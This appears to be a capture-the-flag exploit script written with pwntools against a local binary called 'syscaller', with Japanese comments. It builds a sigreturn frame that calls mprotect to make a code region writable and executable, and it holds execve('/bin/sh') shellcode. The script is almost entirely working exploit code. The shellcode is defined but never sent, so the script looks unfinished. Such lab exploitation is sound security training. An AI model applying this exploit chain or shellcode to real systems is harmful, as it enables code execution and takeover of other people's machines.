#!/usr/bin/env python3
from pwn import *

target = process("./syscaller")
gdb.attach(target, gdbscript="b _start")

#sigreturnを呼ぶ
payload = p64(0x0) * 3
payload += p64(0xf)
payload += p64(0x0) * 4

"""
#mprotect syscallを使って0x400000~0x401000のパーミッションをrwxにする
実行前
0x00000000400000 0x00000000401000 0x00000000000000 r-x 
実行後
0x00000000400000 0x00000000401000 0x00000000000000 rwx
rax = 0xa      #x64の場合 10
rdi = 0x400000 #アドレス位置
rsi = 0x1000   #範囲
rdx = 0x7      #chmodのやつ
"""
context.arch = "amd64"
frame = SigreturnFrame()

frame.rax = 0xa
frame.rdi = 0x400000
frame.rsi = 0x1000
frame.rdx = 0x7
#writeをもう一度利用してrwxにした領域に書き込む
frame.rip = 0x400104
frame.rsp = 0x400200

payload += bytes(frame)

target.recvuntil("perish.\n")
target.sendline(payload)

shellcode = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
target.sendline("test")

target.interactive()